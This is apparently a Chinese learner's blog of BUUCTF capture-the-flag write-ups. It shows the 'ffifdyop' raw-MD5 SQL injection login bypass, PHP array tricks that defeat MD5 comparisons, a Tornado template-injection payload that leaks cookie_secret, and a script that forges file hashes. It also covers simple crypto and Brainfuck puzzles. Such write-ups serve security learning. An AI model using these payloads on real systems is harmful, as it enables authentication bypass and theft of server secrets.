# BUUCTF-MD5强弱比较-MD5()的万能密码-tornado框架注入-中文电码

第六周 第三次

**目录**

[TOC]



## 学习到的知识

#### 1.MD5强弱比较可以都可以使用数组绕过

#### 2.基于MD5()的万能密码    ffifdyop



## WEB

### [BJDCTF2020]Easy MD5



<img src="https://i-blog.csdnimg.cn/blog_migrate/7f58ce33ebf5bf87c2debd55daa80254.png" alt="" style="max-height:636px; box-sizing:content-box;" />


打开环境 什么都没有 输入任何也都没有反应 我们进行抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/a88ccc0c83d4f630c1927e4ece5d2148.png" alt="" style="max-height:203px; box-sizing:content-box;" />


发现查询语句

我们想到sql注入

发现md5函数我们进行搜索

```cobol
md5(1,2)
 
1:是要进行计算的字符串
2：可选  是TRUE 就是将计算完的数字进行16位字符二进制输出
        是FALSE 就是将计算完的数字进行32位字符十六进制输出
```

所以我们明白 我们需要输入一个能够将 16位二进制变为sql注入语句的

我们想到万能密码

在mysql中  对于字符串

```cobol
''or'1xxxxxx' ---->True
''or'0xxxxxx' ---->False
```





所以我们要找到一个字符串 转换为hex 后再变为字符能为'or'非0

```cobol
ffifdyop
 
变为hex后为
 
276F722736C95D99E921722CF9ED621C
 
转为字符串后
 
'or'6É]é!r,ùíb
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e229fa76dc8b51c488892cd548d1e8df.png" alt="" style="max-height:363px; box-sizing:content-box;" />


所以我们输入这个字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/94243b222f56058723aef7cade9f8c00.png" alt="" style="max-height:404px; box-sizing:content-box;" />


查看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/b8cb392ea7e932ed5f2582742a255e4e.png" alt="" style="max-height:249px; box-sizing:content-box;" />


发现弱比较

使用数组绕过

 [MD5绕过（强弱类型比较）_md5弱类型比较_陈wonton的博客-CSDN博客](https://blog.csdn.net/weixin_43332695/article/details/119349204) 

```cobol
?a[]=1&b[]=2
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/5c36d6df1a626a581ff46a5eda03e734.png" alt="" style="max-height:353px; box-sizing:content-box;" />


发现MD5强比较

继续使用数组绕过

```cobol
param1[]=1&param2[]=3
```

得到flag

### [护网杯 2018]easy_tornado

这道对我来说特别新 并且是边看边做

本质是 **SSTI注入** 

并且 题目也提示我们了

tornado是 python编写的框架

类似于后端渲染

```sql
sql注入是用户输入的代码
SSTI注入是框架的注入
```

所以我们开始答题



<img src="https://i-blog.csdnimg.cn/blog_migrate/df27bd356c316b80211ebcd2ab798281.png" alt="" style="max-height:203px; box-sizing:content-box;" />


打开环境 一个一个看过去



<img src="https://i-blog.csdnimg.cn/blog_migrate/3e381fed1f8875f523c8afa48d769654.png" alt="" style="max-height:270px; box-sizing:content-box;" />


在每一个url上面都有一个 hash 然后这个文件就给我们是怎么计算哈希的

我们现在需要找 cookie_secret这个的数值

然后 我们搜索 发现cookie_secret这个是在tornado框架有的文件

在handler.settings 文件下

所以我们寻找注入点

当我们把hash值改变后得到



<img src="https://i-blog.csdnimg.cn/blog_migrate/0fd5a6bfe9a34f981458ad093ac988dc.png" alt="" style="max-height:142px; box-sizing:content-box;" />


我们看看更改error



<img src="https://i-blog.csdnimg.cn/blog_migrate/22af130689bbde2b1a9058068110c60b.png" alt="" style="max-height:221px; box-sizing:content-box;" />


url改什么 他都会返回什么 所以我们找到注入点了 我们在这上面进行框架注入

注意 这个框架注入需要用{{}}来注入

```handlebars
error?msg={{handler.settings}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3f8e572b64d82e3d750c891484dbd103.png" alt="" style="max-height:165px; box-sizing:content-box;" />


得到了数值 然后我们进行计算

```cobol
import hashlib
hash = hashlib.md5()
 
filename='/fllllllllllllag'
cookie_secret="b2ab97ba-5c7a-4fff-a8f5-c459b76e6b8a"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())
```

然后构造

```cobol
file?filename=/fllllllllllllag&filehash=c446c58655463f690c65a78092d75fc3
```

得到flag

 [[护网杯 2018]easy_tornado WriteUp（超级详细！）_lunan0320的博客-CSDN博客](https://blog.csdn.net/qq_51927659/article/details/116031923) 

## Crypto

### 信息化时代的步伐

得到新的加密方法 中文电码

 [中文电码查询 - 中文电码转换 - 中文电码对照表](https://dianma.bmcx.com/) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/1db3af4e4eb6e324d9b507932610fac9.png" alt="" style="max-height:180px; box-sizing:content-box;" />


### 凯撒？替换？呵呵!

我们进行比对 MTHJ得到flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/b0ddcf4d4e4e7616a906a5622c3e9c49.png" alt="" style="max-height:412px; box-sizing:content-box;" />


 [quipqiup - cryptoquip and cryptogram solver](https://quipqiup.com/) 

使用这个暴力破解



<img src="https://i-blog.csdnimg.cn/blog_migrate/adcbeb65f32e08f8a3501b2ce4c0aadf.png" alt="" style="max-height:192px; box-sizing:content-box;" />


发现第一条就是可以读的句子

## Misc

### 神秘龙卷风

暴力破解

 [Brainfuck - interpreter online](http://bf.doleczek.pl/) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/815101fbefb4c256faca0080c376f675.png" alt="" style="max-height:781px; box-sizing:content-box;" />


放入网站

<img src="https://i-blog.csdnimg.cn/blog_migrate/6b1cf420a8621abec73eeb49eb128d44.png" alt="" style="max-height:169px; box-sizing:content-box;" />


得到flag